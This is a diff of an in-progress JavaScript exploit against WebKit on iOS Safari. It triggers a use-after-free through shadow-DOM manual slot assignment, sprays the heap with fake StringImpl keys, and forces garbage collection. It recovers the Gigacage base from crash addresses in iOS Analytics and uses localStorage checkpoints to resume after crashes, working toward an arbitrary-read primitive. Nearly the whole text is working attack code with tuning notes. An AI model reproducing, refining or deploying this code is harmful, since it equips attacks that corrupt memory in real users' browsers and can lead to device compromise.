-    // Candidates from oracle are VA offsets from Gigacage base — convert to BigInt
-    // We don't know the absolute base, but we can use relative offsets to distinguish:
-    // The self-ref trick: if our injection buf IS at base+candidate_offset, then
-    //   reading back a non-crashing dereference = we hit controlled memory.
-    // For safety we wrap each probe in try/catch: crash = wrong candidate, no crash = hit.
+    try { // ── P6A/P6B global try/catch — catches silent JS exceptions ──────────
 
-    // ── Phase 6A: gigacageBase sweep ─────────────────────────────────────────
+    // ── Phase 6A: gigacageBase — localStorage checkpoint + analytics method ──
     //
-    // T9 could not produce a rank-fit intercept (only 2 DRAM-visible allocs).
-    // Derive gigacageBase by sweep: on arm64e iOS 26 (A16), WebKit's Primitive
-    // Gigacage (ArrayBuffer backing stores) sits at a randomized but
-    // alignment-constrained base. Known range from arm64e iOS research:
-    //   0x14000000000 – 0x20000000000  (step: multiples of 0x800000000, 32GB)
+    // DESIGN NOTE: The crash-sweep approach (fire UAF with non-null key ptr, catch crash)
+    // does NOT work on iOS Safari. A KERN_INVALID_ADDRESS from JS-triggered memory
+    // corruption kills the ENTIRE WebContent process — JS try/catch cannot intercept it.
+    // The page simply dies. We redesign around this constraint.
     //
-    // Strategy:
-    //   For each candidate base, plant key_ptr = base + highConf[0] in ONE probe.
-    //   If it crashes → base wrong (key_ptr → unmapped page).
-    //   If NO crash → base is correct (key_ptr → our injection buf in Gigacage).
-    //   Once found → run full Phase 6 probe sweep.
+    // NEW STRATEGY (two-pass):
     //
-    // 16 base candidates × 1 probe each = 16 probes ≈ 25ms.
+    // Pass 1 (this run): Intentionally fire ONE UAF probe with a NON-NULL key using the
+    //   MOST LIKELY Gigacage base (0x200000000000 — historically most common on A16 iOS).
+    //   Save a checkpoint to localStorage BEFORE the probe with the testVA we're trying.
+    //   If testVA is UNMAPPED → page crashes → user reads KERN_INVALID_ADDRESS from
+    //   Settings → Privacy → Analytics & Improvements → Analytics Data → WebContent crash.
+    //   The faulting_address in that crash IS testVA.
+    //   gigacageBase = faulting_address - sweepOffset.
     //
-    // Candidate bases (arm64e Gigacage alignment = 32GB = 0x800000000):
-    const GIGACAGE_BASE_CANDIDATES = [
-      0x14000000000n, 0x14800000000n, 0x15000000000n, 0x15800000000n,
-      0x16000000000n, 0x16800000000n, 0x17000000000n, 0x17800000000n,
-      0x18000000000n, 0x18800000000n, 0x19000000000n, 0x19800000000n,
-      0x1a000000000n, 0x1a800000000n, 0x1b000000000n, 0x1b800000000n,
-      0x1c000000000n, 0x1c800000000n, 0x1d000000000n, 0x1d800000000n,
-      0x1e000000000n, 0x1e800000000n, 0x1f000000000n, 0x1f800000000n,
-      0x20000000000n, 0x20800000000n, 0x21000000000n, 0x21800000000n,
-      0x22000000000n, 0x22800000000n, 0x23000000000n, 0x23800000000n,
-    ];
+    // Pass 2 (hardcoded base run): If localStorage shows a prior crash checkpoint,
+    //   load the saved faulting_address → compute base → skip sweep → run P6B.
+    //
+    // If Pass 1 survives (no crash): the most-likely base WAS correct → P6B runs immediately.
+    //
+    // The checkpoint also encodes which base we tried, so if the page crashes we can
+    // compute base = (checkpoint.testVA - checkpoint.sweepOffset) on reload.
 
-    // Use top oracle candidate as the probe offset for the base sweep
-    const sweepOffset = BigInt((highConf.length > 0 ? highConf : sprayHex)[0] || 0x10C000);
-    // Freed size for sweep probe (use same as main UAF)
-    const p6sweepFreedSz = freedBucketSizeForGhosts(20);
-    const p6sweepPumpCount = pumpCountForGhosts(20);
+    // highConf entries are score objects {c, score, va, breakdown}; c*16384 = byte offset
+    // sprayHex entries are hex strings like '0x00134000'
+    // v21: P6_PAGE=16384 hoisted to IIFE scope — do NOT redeclare here.
+    const _hcOffset = highConf.length > 0
+      ? highConf[0].c * P6_PAGE
+      : (sprayHex.length > 0 ? parseInt(sprayHex[0], 16) : 0x10C000);
+    const sweepOffset = BigInt(_hcOffset || 0x10C000);
+    const p6sweepFreedSz = freedBucketSizeForGhosts(28);  // v19: 20→28
+    const p6sweepPumpCount = pumpCountForGhosts(28);       // v19: 20→28
 
+    // ── Check localStorage for prior crash ──────────────────────────────────
     let gigacageBase = 0n;
-    log('\n[P6A] gigacageBase sweep — trying 32 arm64e candidate bases...');
-    log(`[P6A] Probe offset (highConf[0]): 0x${sweepOffset.toString(16)}`);
+    // v53: on auto-retry, skip Phase 6A probe — we have confirmed gigacageBase from saved state
+    if (_v52RetryState) {
+      try { gigacageBase = BigInt('0x' + _v52RetryState.gigacageBase); } catch(_) {}
+      log(`[P6A] v53 retry: skipping Phase 6A probe, using saved gigacageBase=0x${gigacageBase.toString(16)}`);
+    }
+    const LS_KEY = 'p6a_checkpoint';
+    let priorCheckpoint = null;
+    if (!_v52RetryState) try { priorCheckpoint = JSON.parse(localStorage.getItem(LS_KEY) || 'null'); } catch(_) {}
 
-    for (const baseCand of GIGACAGE_BASE_CANDIDATES) {
-      const testVA = baseCand + sweepOffset;
+    if (priorCheckpoint && priorCheckpoint.faultAddr) {
+      // Pass 2: user pasted fault addr from analytics into localStorage manually,
+      // OR we stored it from a prior probe. Derive base.
+      const fa = BigInt('0x' + priorCheckpoint.faultAddr.replace(/^0x/,''));
+      const so = BigInt('0x' + (priorCheckpoint.sweepOffset || sweepOffset.toString(16)));
+      gigacageBase = fa - so;
+      log(`\n[P6A] ✓ Prior crash checkpoint found!`);
+      log(`[P6A]   faultAddr=0x${fa.toString(16)}  sweepOffset=0x${so.toString(16)}`);
+      log(`[P6A]   → gigacageBase=0x${gigacageBase.toString(16)}`);
+      try { localStorage.removeItem(LS_KEY); } catch(_) {}
+    } else if (priorCheckpoint && priorCheckpoint.testVA && !priorCheckpoint.survived) {
+      // Pass 2: page crashed on prior run (checkpoint written but no 'survived' flag).
+      // We infer the faultAddr = testVA (that's what gets faulted on KERN_INVALID_ADDRESS).
+      const fa = BigInt('0x' + priorCheckpoint.testVA.replace(/^0x/,''));
+      const so = BigInt('0x' + priorCheckpoint.sweepOffset.replace(/^0x/,''));
+      gigacageBase = fa - so;
+      log(`\n[P6A] ✓ Prior run crashed as expected — inferring base from checkpoint`);
+      log(`[P6A]   testVA=0x${fa.toString(16)}  sweepOffset=0x${so.toString(16)}`);
+      log(`[P6A]   → gigacageBase=0x${gigacageBase.toString(16)}`);
+      log(`[P6A]   (Verify: check Settings→Analytics→WebContent crash for KERN_INVALID_ADDRESS)`);
+      log(`[P6A]   (Expected crash addr: 0x${fa.toString(16)} ± small offset)`);
+      try { localStorage.removeItem(LS_KEY); } catch(_) {}
+    } else if (!_v52RetryState) {
+      // Pass 1: first run — try the most likely base, save checkpoint before probe
+      // v53: skipped on auto-retry (gigacageBase already set from saved state above)
+      //
+      // Most common A16 iOS 26 Gigacage base from public arm64e research:
+      // 0x200000000000 — this is the "middle" of the ASLR range and most frequently observed.
+      // If this probe crashes (wrong base), the crash addr tells us the real base.
+      const MOST_LIKELY_BASE = 0x200000000000n;
+      const testVA = MOST_LIKELY_BASE + sweepOffset;
 
-      // build minimal UAF setup for one sweep probe
+      // Save checkpoint BEFORE the probe — if page dies, this persists
+      try {
+        localStorage.setItem(LS_KEY, JSON.stringify({
+          testVA: '0x' + testVA.toString(16),
+          sweepOffset: '0x' + sweepOffset.toString(16),
+          baseCand: '0x' + MOST_LIKELY_BASE.toString(16),
+          survived: false,
+          ts: Date.now()
+        }));
+      } catch(_) {}
+
+      log(`\n[P6A] gigacageBase: single-probe pass (iOS crash-safe design)`);
+      log(`[P6A] Trying most likely base: 0x${MOST_LIKELY_BASE.toString(16)}`);
+      log(`[P6A] testVA = 0x${testVA.toString(16)}`);
+      log(`[P6A] ⚠️  If page crashes after this line → check iOS Analytics for KERN_INVALID_ADDRESS`);
+      log(`[P6A] ⚠️  Then reload — base will be auto-computed from checkpoint`);
+
+      // Build UAF setup for single probe
+      // v22 FIX: ghosts go into swSlot (not a separate _swGhostSlot) — same m_slots map as pump target.
       const swHost   = document.body.appendChild(document.createElement('div'));
       const swShadow = swHost.attachShadow({ mode: 'open', slotAssignment: 'manual' });
       const swSlot   = swShadow.appendChild(document.createElement('slot'));
-      const swOther  = swShadow.appendChild(document.createElement('slot'));
       const swA      = swHost.appendChild(document.createElement('span'));
       const swB      = swHost.appendChild(document.createElement('span'));
-      swSlot.assign(swA); swOther.assign(swB);
-      for (let i = 0; i < 20; ++i)
-        swShadow.appendChild(document.createElement('slot')).remove();
+      // v22: batch assign ghosts + swA + swB into swSlot (g+2 ops < threshold ✓)
+      const _swGhostElems = [];
+      for (let i = 0; i < 28; ++i) {  // P6_GHOSTS=28 (pumpCount=3, freedSz=1024B)
+        const _sge = document.createElement('span');
+        swHost.appendChild(_sge);
+        _swGhostElems.push(_sge);
+      }
+      swSlot.assign(swA, swB, ..._swGhostElems); // v22: ghosts in swSlot.m_slots (g+2=30 ops < threshold=32 ✓)
+      // releaseGhosts: reassign swSlot to live-only → drops g ghosts → g ops → cleanup fires once (ghosts still alive → no shrink)
+      _swGhostElems.forEach(g => g.remove());
+      swSlot.assign(swA, swB);          // v22: drop ghosts from swSlot.m_manuallyAssigned (fires g ensure() calls)
+      _swGhostElems.length = 0;         // JS refs gone → GC → C++ refcount→0 → WeakPtrs null
 
       let swInjected = false;
+      let _swTriggerReady = false; // v15: gate pump-time slotchange
+      let _swInjStrings = null; // hold alive past slotchange return for stale deref
+      const _swCharCount = p6sweepFreedSz - 16;
       swSlot.addEventListener('slotchange', () => {
-        const epp = Math.floor(p6sweepFreedSz / 16);
-        for (let i = 0; i < 512; i++) {         // smaller pool for sweep — just 512
-          const buf = new ArrayBuffer(p6sweepFreedSz);
-          const u32 = new Uint32Array(buf);
-          const u64 = new BigUint64Array(buf);
-          for (let j = 0; j < epp; j++) {
-            u64[j * 2]     = testVA;  // absolute key VA using this base candidate
-            u32[j * 4 + 2] = 1;       // m_count=1 → isLive=true
-            u32[j * 4 + 3] = 0;
-          }
+        if (!_swTriggerReady) return; // v15: skip pump-time slotchange fires
+        const _strs = [];
+        for (let i = 0; i < 4096; i++) {
+          const s = makeSprayString(_swCharCount);
+          forceStringHash(s);
+          _strs.push(s);
         }
+        drainHashMap();
+        _swInjStrings = _strs;
         swInjected = true;
       });
 
-      forceGC();
-      await new Promise(r => setTimeout(r, 30));
+      await forceGC();
+      await new Promise(r => setTimeout(r, 100));
+      await forceGC();
+      await new Promise(r => setTimeout(r, 100));
 
       let swCrash = false;
       try {
         for (let i = 0; i < p6sweepPumpCount; i++)
           swSlot.assign(i % 2 === 0 ? swA : swB);
         const swNew = swHost.appendChild(document.createElement('span'));
+        _swTriggerReady = true; // v15: arm gate before final assign
         swSlot.assign(swNew);
         swHost.remove();
       } catch(e) {
@@ -1568,41 +2603,78 @@ function checkNodeLeak(nodes, expectedNode) {
         swHost.remove();
       }
 
-      const label = `0x${baseCand.toString(16)}`;
       if (!swCrash && swInjected) {
-        gigacageBase = baseCand;
-        log(`[P6A] ✓ HIT: gigacageBase=${label} — no crash, injection fired → BASE FOUND`);
-        break;
+        // Most-likely base was correct OR UAF traversal didn't fire this pass
+        gigacageBase = MOST_LIKELY_BASE;
+        try {
+          localStorage.setItem(LS_KEY, JSON.stringify({
+            testVA: '0x' + testVA.toString(16),
+            sweepOffset: '0x' + sweepOffset.toString(16),
+            baseCand: '0x' + MOST_LIKELY_BASE.toString(16),
+            survived: true,
+            ts: Date.now()
+          }));
+        } catch(_) {}
+        log(`[P6A] ✓ Probe survived — assuming gigacageBase=0x${MOST_LIKELY_BASE.toString(16)}`);
+        log(`[P6A]   (non-crash could mean: correct base, OR UAF traversal didn't deref key this run)`);
+        log(`[P6A]   If P6B all-crash → base was wrong; reload and try next candidate`);
       } else if (!swInjected) {
-        log(`[P6A] ? ${label}: injection did not fire (slotchange missed)`);
+        // v29: don't leave base at 0n when injection missed — default to confirmed prior base
+        gigacageBase = MOST_LIKELY_BASE;
+        log(`[P6A] ? Injection didn't fire — slotchange missed this pass`);
+        log(`[P6A] v29: defaulting gigacageBase=0x${MOST_LIKELY_BASE.toString(16)} (confirmed from prior crash)`);
+        log(`[P6A]   P6B will run with assumed base — noisy if wrong, but worth probing`);
       } else {
-        // crashed — expected, just don't spam the log
-        if (GIGACAGE_BASE_CANDIDATES.indexOf(baseCand) % 8 === 0)
-          log(`[P6A] ✗ ${label}: crash (unmapped) — continuing sweep...`);
+        // JS-catchable exception (not a process-kill crash)
+        gigacageBase = MOST_LIKELY_BASE;
+        log(`[P6A] JS exception caught (not process crash) — base assumed: 0x${MOST_LIKELY_BASE.toString(16)}`);
       }
-      await new Promise(r => setTimeout(r, 5));
-    }
 
-    if (gigacageBase === 0n) {
-      log('[P6A] ✗ Sweep exhausted — gigacageBase not found in known range');
-      log('[P6A] Possible causes:');
-      log('[P6A]   (1) Gigacage base is outside the swept range on this iOS 26 build');
-      log('[P6A]   (2) Sweep injection pool (512 bufs) didn\'t reclaim the freed slot');
-      log('[P6A]       → increase sweep pool size from 512 to 2048 and retry');
-      log('[P6A]   (3) UAF is non-deterministic — try re-running (HARD confirm may appear)');
-      log('[P6A] ACTION: paste a WebContent crash KERN_INVALID_ADDRESS from Settings→Analytics');
-      log('[P6A]   → faulting_va - sweepOffset = gigacageBase — hardcode above and rerun');
-    } else {
-      log(`\n[P6A] gigacageBase confirmed: 0x${gigacageBase.toString(16)}`);
-      log(`[P6A] Absolute spray target[0]: 0x${(gigacageBase + sweepOffset).toString(16)}`);
+      if (gigacageBase === 0n) {
+        log(`\n[P6A] gigacageBase unresolved.`);
+        log(`[P6A] IF page crashed just now: reload this page.`);
+        log(`[P6A]   → checkpoint was saved to localStorage before the probe`);
+        log(`[P6A]   → on reload, base = (crash_addr - 0x${sweepOffset.toString(16)}) is auto-computed`);
+        log(`[P6A] IF page did NOT crash: try reloading to retry injection (UAF is non-deterministic)`);
+        log(`\n[P6A] MANUAL FALLBACK (if reload doesn't work):`);
+        log(`[P6A]   1. Settings → Privacy → Analytics & Improvements → Analytics Data`);
+        log(`[P6A]   2. Find WebContent crash with KERN_INVALID_ADDRESS`);
+        log(`[P6A]   3. Note the faulting_address value (e.g. 0x200000XXXXXX)`);
+        log(`[P6A]   4. Open browser console and run:`);
+        log(`[P6A]      localStorage.setItem('p6a_checkpoint', JSON.stringify({faultAddr:'<ADDR>', sweepOffset:'0x${sweepOffset.toString(16)}', survived:true}))`);
+        log(`[P6A]   5. Reload this page → Phase 6B will run with the correct base`);
+      } else {
+        log(`\n[P6A] gigacageBase: 0x${gigacageBase.toString(16)}`);
+        log(`[P6A] Absolute spray VA[0]: 0x${(gigacageBase + sweepOffset).toString(16)}`);
+      }
     }
 
     // ── Phase 6B: Full arb-read probe sweep (if base found) ──────────────────
-    const candidates = (highConf.length > 0 ? highConf : sprayHex).slice(0, 32);
+    // Build candidates as numeric byte offsets (PAGE_SIZE=16384 local since t10() scope)
+    // v53: if auto-retry state present, override gigacageBase + candidates from saved oracle results
+    if (_v52RetryState) {
+      try {
+        gigacageBase = BigInt('0x' + _v52RetryState.gigacageBase);
+      } catch(_) {}
+    }
+    const candidates = _v52RetryState
+      ? _v52RetryState.candidates.map(Number)
+      : (highConf.length > 0
+          ? highConf.slice(0, 32).map(s => s.c * P6_PAGE)
+          : sprayHex.slice(0, 32).map(v => parseInt(v, 16)));
     let p6Hits = 0;
+    let p6InjCount = 0;  // v52: injection=true NO-CRASH counter (separate from crash-reload hits)
     let p6Crashes = 0;
     let p6NoCrashNoAnomaly = 0;
     const p6HitLog = [];
+
+    // v29: log fake StringImpl key values for each size class so chief can compare vs Analytics crash addrs
+    log('\n[P6B] Fake StringImpl key values by freed bucket size (compare against KERN_INVALID_ADDRESS crash):');
+    log('[P6B]   1024B bucket → key bytes[0-7] = 0x3F000000001  (refCount=1, charCount=0x3F=63 → VA ~0x3F00000000)');
+    log('[P6B]   2048B bucket → key bytes[0-7] = 0x7F000000001  (refCount=1, charCount=0x7F=127 → VA ~0x7F00000000)');
+    log('[P6B]   4096B bucket → key bytes[0-7] = 0xFF000000001  (refCount=1, charCount=0xFF=255 → VA ~0xFF00000000)');
+    log('[P6B]   NOTE: charCount<<32 is used as hash key pointer — unmapped on 64-bit iOS userspace');
+    log('[P6B]   If crash addr matches above pattern → fake StringImpl deref confirmed');
 
     if (gigacageBase === 0n) {
       log('\n[P6B] Skipping arb-read probe sweep — base unresolved');
@@ -1610,91 +2682,267 @@ function checkNodeLeak(nodes, expectedNode) {
       log(`\n[P6B] Arb-read sweep: base=0x${gigacageBase.toString(16)}, ${candidates.length} candidates`);
     }
 
-    for (let ci = 0; ci < (gigacageBase === 0n ? 0 : candidates.length); ci++) {
-      const candidateOffset = candidates[ci]; // number (hex offset)
+    // ── v28: P6B REDESIGN — reuse Phase 4's injected cases, no fresh UAF setup ──
+    //
+    // ROOT CAUSE of v27 P6B all-"injected=false":
+    //   v27 P6B built a FRESH uafSetup() per probe inside this loop.
+    //   Fresh setup never did forceGC() for the NEW ghost elems → ghosts still alive
+    //   → WeakPtrs not null → amortizedCleanup never fires → injection gate never open.
+    //   P6B was independently broken from Phase 4, which DID do forceGC().
+    //
+    // v28 FIX:
+    //   Skip per-probe fresh UAF. Instead iterate the EXISTING Phase 4 injected cases
+    //   (allCases where isInjected()=true). These cases ALREADY had:
+    //     1. forceGC() → ghosts confirmed dead → WeakPtrs null
+    //     2. pump → threshold crossed → amortizedCleanup fired → SHRINK → old bucket freed
+    //     3. slotchange injection → spray strings filled freed bucket
+    //
+    //   For each injected case, re-fire a fresh assign() to drive another traversal
+    //   of m_buckets (now pointing to new smaller bucket). The injection strings from
+    //   Phase 4 may still be alive (held by c.getStrings()). If new bucket re-triggers
+    //   cleanup (unlikely — it's smaller), we might get another injection.
+    //
+    //   The KEY observation: the stale pointer to the old bucket IS in the C++ object.
+    //   But the only way to trigger a traversal of the OLD bucket is if m_buckets was
+    //   NOT updated. Since SHRINK does update m_buckets, normal assign() paths won't
+    //   hit old bucket. The traversal that COULD hit old bucket is the one that fires
+    //   synchronously DURING the shrink (inside slotManualAssignmentDidChange before
+    //   the new bucket ptr is written). We already captured that with Phase 4 injection.
+    //
+    //   What P6B CAN do:
+    //     1. Log that injection fired and strings are alive → fake StringImpl key is in memory
+    //     2. Force another forceGC() to see if fresh cleanup fires on the new bucket
+    //     3. After re-trigger, check if assignedNodes() returns anomalous data
+    //        (would indicate m_assignedNodes corruption, separate from m_buckets)
+    //
+    //   The CRASH SIGNAL (KERN_INVALID_ADDRESS) we want comes from:
+    //     traversal deref's key field of a fake StringImpl entry that our spray placed
+    //     in the freed bucket. This happens ONLY during the initial SHRINK traversal.
+    //     Phase 4.75 Path B (assign(childA) post-injection) attempts to re-trigger this.
+    //     If P4.75 Path B crashed → already got the signal → P6B just confirms base.
+    //
+    //   So: P6B v28 = iterate injected cases, do a few extra assign() probes,
+    //     log results. If ANY crash: localStorage checkpoint → base confirmed.
 
-      // Build a fresh UAF setup with a custom injection handler for this candidate
-      const p6host = document.body.appendChild(document.createElement('div'));
-      const p6shadow = p6host.attachShadow({ mode: 'open', slotAssignment: 'manual' });
-      const p6slot = p6shadow.appendChild(document.createElement('slot'));
-      const p6other = p6shadow.appendChild(document.createElement('slot'));
-      const p6A = p6host.appendChild(document.createElement('span'));
-      const p6B = p6host.appendChild(document.createElement('span'));
-      const p6decoy = p6host.appendChild(document.createElement('span'));
-      p6slot.assign(p6A);
-      p6other.assign(p6B);
-      for (let i = 0; i < P6_GHOSTS; ++i)
-        p6shadow.appendChild(document.createElement('slot')).remove();
+    const P6B_LS_KEY = 'p6b_probe';
+    // Check for prior P6B crash checkpoint
+    try {
+      const p6bPrior = JSON.parse(localStorage.getItem(P6B_LS_KEY) || 'null');
+      if (p6bPrior) {
+        log(`[P6B] ✓ PRIOR RUN CRASHED in P6B!`);
+        log(`[P6B]   candidate[${p6bPrior.idx}]=0x${p6bPrior.va}  base=0x${p6bPrior.gigacageBase}`);
+        log(`[P6B]   → WebContent killed → KERN_INVALID_ADDRESS confirmed`);
+        log(`[P6B]   → fake StringImpl key deref hit unmapped address`);
+        log(`[P6B]   → UAF arb-crash primitive CONFIRMED`);
+        p6Hits++;
+        p6HitLog.push({ candidate: p6bPrior.va, type: 'crash-reload' });
+        localStorage.removeItem(P6B_LS_KEY);
+      }
+    } catch(_) {}
 
-      let p6Injected = false;
-      p6slot.addEventListener('slotchange', () => {
-        // Fake WeakImpl entry with key ptr = BigInt(candidateOffset)
-        // m_count = 1 → isLive() = true → traversal reads key ptr
-        // key ptr = candidateOffset (might be wrong → crash, or right → no crash)
-        const entriesPerBuf = Math.floor(p6FreedSz / 16);
-        for (let i = 0; i < 2048; i++) {
-          const buf = new ArrayBuffer(p6FreedSz);
-          const u32 = new Uint32Array(buf);
-          const u64 = new BigUint64Array(buf);
-          for (let j = 0; j < entriesPerBuf; j++) {
-            u64[j * 2]     = gigacageBase + BigInt(candidateOffset); // absolute key VA
-            u32[j * 4 + 2] = 1;           // m_count = 1 → isLive() = true
-            u32[j * 4 + 3] = 0;
+    // v51: P6B REDESIGN — revert to Phase 4 / P6A SHRINK injection recipe (exact).
+    // v50 root cause: injectGhostIntoAssignedNodes → assign(childA,ghost0) then assign(childA)
+    //   → second assign() calls clearManuallyAssignedNodes() → wipes m_assignedNodes → ghost[0]
+    //   entry gone immediately. assignedNodes() stale-read path impossible via assign().
+    // v51 FIX: Abandon assignedNodes() approach. Use Phase 4 confirmed injection path directly.
+    //   Per-probe recipe (mirrors Phase 4 / P6A exactly):
+    //     1. fresh uafSetup(28, pumpCount, 1024) case
+    //     2. releaseGhosts()              — drop all ghosts, slot={childA,childB}
+    //     3. GC loop (ALL ghosts, no exclusion)
+    //     4. extra GC round (C++ finalizer drain)
+    //     5. let p = _pc.primeFreelist(); p = null  — prime full-size freelist, drop sync
+    //     6. await tick × 2               — freed primed strings hit LIFO
+    //     7. _pc.armTrigger()             — open gate
+    //     8. pump pumpCount-1 times       — accum opCount, stay just below threshold
+    //     9. await tick
+    //    10. targetSlot.assign(childA)    — final trigger → opCount threshold → SHRINK → gate open
+    //                                       → slotchange fires → wave1 spray reclaims freed oldBucket
+    //    11. await tick × 2              — microtasks drain
+    //    12. check _pc.isInjected()      — injected=true = SHRINK fired + spray ran
+    //    If injected: KERN_INVALID_ADDRESS expected. localStorage checkpoint records VA.
+
+    if (gigacageBase === 0n) {
+      log('[P6B] Skipping arb-crash probe sweep — gigacageBase unresolved');
+    }
+
+    const _p6bCandToTry = (gigacageBase !== 0n)
+      ? candidates.slice(0, Math.min(32, candidates.length))
+      : [];
+
+    if (_p6bCandToTry.length > 0) {
+      const P6B_POOL_SIZE = _p6bCandToTry.length;
+      log(`[P6B] v51: building ${P6B_POOL_SIZE} fresh uafSetup cases (Phase 4 recipe)...`);
+
+      // ── POOL BUILD ─────────────────────────────────────────────────────────
+      // One fresh uafSetup(28) per probe candidate. freedSz=1024B, pumpCount=3.
+      const p6bPool = [];
+      for (let _pi = 0; _pi < P6B_POOL_SIZE; _pi++) {
+        const _pc = uafSetup(28); // ghosts=28 → pumpCount=3, freedSz=1024B
+        await new Promise(r => setTimeout(r, 0));
+        p6bPool.push(_pc);
+      }
+      log(`[P6B] v51: pool built — releasing ghosts on all ${P6B_POOL_SIZE} cases...`);
+
+      // ── RELEASE GHOSTS ─────────────────────────────────────────────────────
+      for (const _pc of p6bPool) _pc.releaseGhosts();
+      await new Promise(r => setTimeout(r, 0));
+
+      // ── BATCH GC — FinalizationRegistry-confirmed loop ─────────────────────
+      // v51: GC target = ALL ghosts (no _ghost0 exclusion).
+      const p6bTotalGhosts = p6bPool.reduce((s, _pc) => s + _pc.ghosts, 0);
+      const p6bGCTarget = p6bTotalGhosts; // v51: all ghosts die — no ghost[0] exclusion
+      const p6bGetDeadTotal = () => p6bPool.reduce((s, _pc) => s + _pc.getGhostDeadCount(), 0);
+      log(`[P6B] v51: waiting for GC — target ${p6bGCTarget}/${p6bTotalGhosts} ghosts (all must die)...`);
+      const p6bGcStart = Date.now();
+      let p6bGcRound = 0;
+      while (p6bGetDeadTotal() < p6bGCTarget) {
+        if (Date.now() - p6bGcStart > 45000) {
+          log(`[P6B GC] ⚠ TIMEOUT — ${p6bGetDeadTotal()}/${p6bGCTarget} confirmed dead, proceeding`);
+          break;
+        }
+        await hardForceGC(`p6b round ${++p6bGcRound} (dead=${p6bGetDeadTotal()}/${p6bGCTarget})`);
+        await new Promise(r => setTimeout(r, 400));
+        document.body.offsetHeight;
+      }
+      log(`[P6B] v51: GC done — ${p6bGetDeadTotal()}/${p6bGCTarget} ghosts confirmed dead (${p6bGcRound} rounds)`);
+
+      // v36: second GC pass — C++ finalizer drain (matches Phase 4 / P6A two-round pattern)
+      await hardForceGC(`p6b extra-round (C++ finalizer drain, dead=${p6bGetDeadTotal()}/${p6bGCTarget})`);
+      await new Promise(r => setTimeout(r, 400));
+      document.body.offsetHeight;
+      log(`[P6B] v51: extra GC round done — ${p6bGetDeadTotal()}/${p6bGCTarget} dead`);
+      await new Promise(r => setTimeout(r, 500));
+
+      // ── PROBE SWEEP ─────────────────────────────────────────────────────────
+      // Phase 4 / P6A exact recipe per probe. No stale WeakPtr machinery.
+      log('[P6B] v51: starting probe sweep (Phase 4 / P6A SHRINK injection recipe)...');
+      for (let ci = 0; ci < _p6bCandToTry.length; ci++) {
+        const candidateOffset = _p6bCandToTry[ci];
+        const _p6bAbsVA = gigacageBase + BigInt(candidateOffset);
+        const _pc = p6bPool[ci];
+        const { targetSlot, childA, childB, pumpCount: _pumpCount } = _pc;
+
+        // Checkpoint BEFORE probe — if page reloads, we know which VA caused the crash
+        try {
+          localStorage.setItem(P6B_LS_KEY, JSON.stringify({
+            idx: ci,
+            va: '0x' + _p6bAbsVA.toString(16),
+            gigacageBase: '0x' + gigacageBase.toString(16),
+            ts: Date.now()
+          }));
+        } catch(_) {}
+
+        // v53: per-candidate charCount encoding.
+        // Encode the candidate offset into the spray StringImpl charCount so the
+        // KERN_INVALID_ADDRESS crash address reveals WHICH candidate hit.
+        // key = u64(refCount=1 | charCount<<32)
+        // charCount = candidateOffset >> 14  (4KB page → 14-bit shift to fit u32)
+        // On crash: faultAddr ≈ (charCount << 32) = candidateOffset << 18
+        // We log charCount per probe so chief can reverse it from crash addr.
+        // Cap at 0x3FFFFFFF so it stays a valid Latin-1 char count (< 2^30).
+        const _p6bCharCount = Math.min(0x3FFFFFFF, (candidateOffset >> 14) >>> 0);
+        const _p6bHalfCharCount = Math.max(1, Math.floor((_p6bCharCount) / 2));
+
+        let p6Exception = false;
+        let p6Injected = false;
+        try {
+          // v53: per-probe spray override — prime freelist with candidate-encoded charCount
+          // so crash address encodes which candidate fired.
+          // Override the uafSetup STR_CHAR_COUNT with _p6bCharCount for this probe's prime.
+          // We call primeFreelist() from the pool case (uses freedSz-16=1008) then
+          // additionally flood the LIFO with candidate-encoded strings AFTER dropping primed.
+          // Phase 4 / P6A exact recipe + v53 bonus pumps:
+          // Step 5: prime freelist with candidate-encoded strings
+          let _primed = _pc.primeFreelist();
+          // v53: also prime with candidate-encoded size so our fake key encodes the VA
+          const _p6bCandPrime = [];
+          for (let _cpi = 0; _cpi < 256; _cpi++) {
+            const _cs = makeSprayString(_p6bCharCount);
+            forceStringHash(_cs);
+            _p6bCandPrime.push(_cs);
+          }
+          forceHashAndRelease(_p6bCandPrime);
+          _primed = null; // drop ref — freed strings hit LIFO freelist
+          // Step 6: 2 ticks — let freed strings settle on LIFO
+          await new Promise(r => setTimeout(r, 0));
+          await new Promise(r => setTimeout(r, 0));
+          // Step 7: arm trigger gate
+          _pc.armTrigger();
+          // Step 8: pump pumpCount-1 times (accumulate opCount, stay just below threshold)
+          const _p6bPumpCount = Math.max(1, _pumpCount - 1);
+          for (let _pi = 0; _pi < _p6bPumpCount; _pi++) {
+            targetSlot.assign(_pi % 2 === 0 ? childB : childA);
+          }
+          // Step 9: tick
+          await new Promise(r => setTimeout(r, 0));
+          // Step 10: final trigger — assign(childA) → opCount threshold → SHRINK → gate open
+          //   SHRINK: free(oldBucket 1024B) → slotchange fires → wave1 spray (4096×1008-char)
+          //   reclaims freed 1024B slot.
+          targetSlot.assign(childA);
+          // Step 11: 2 ticks — microtasks drain (slotchange + spray runs)
+          await new Promise(r => setTimeout(r, 0));
+          await new Promise(r => setTimeout(r, 0));
+          // ── v53 KEY FIX: bonus pumps post-SHRINK ─────────────────────────────────
+          // ROOT CAUSE of v52 20/20 NO-CRASH:
+          //   After SHRINK fires, opCount resets to 0 in the new bucket.
+          //   The trigger assign() is the LAST operation — nobody reads the freed bucket.
+          //   effectiveCurrent() is never called on the stale m_slots ptr after spray lands.
+          //
+          // FIX (from v40 confirmed-crashing recipe):
+          //   After trigger + 2 ticks: add 8 bonus assign() calls.
+          //   Each assign() → slotManualAssignmentDidChange → m_slots.ensure() →
+          //   amortizedCleanup() → opCount += 2 → when opCount > threshold:
+          //   2nd amortizedCleanup fires → TRAVERSES new bucket (= our fake spray StringImpl)
+          //   → bucket[0].key = u64(refCount=1|charCount<<32) → unmapped VA → KERN_INVALID_ADDRESS
+          //
+          //   8 bonus pumps × 2 ops = 16 ops. New-bucket threshold = newCap/2 ≈ 8.
+          //   opCount(0) + 16 = 16 ≥ threshold → 2nd amortizedCleanup fires → TRAVERSAL → crash.
+          const _bonusPumps = 8;
+          for (let _bp = 0; _bp < _bonusPumps; _bp++) {
+            targetSlot.assign(_bp % 2 === 0 ? childB : childA);
+          }
+          // Step 12: 2 more ticks — bonus pump microtasks drain
+          await new Promise(r => setTimeout(r, 0));
+          await new Promise(r => setTimeout(r, 0));
+          // Step 13: check injection
+          p6Injected = _pc.isInjected();
+        } catch(e) {
+          p6Exception = true;
+        }
+
+        try { localStorage.removeItem(P6B_LS_KEY); } catch(_) {}
+
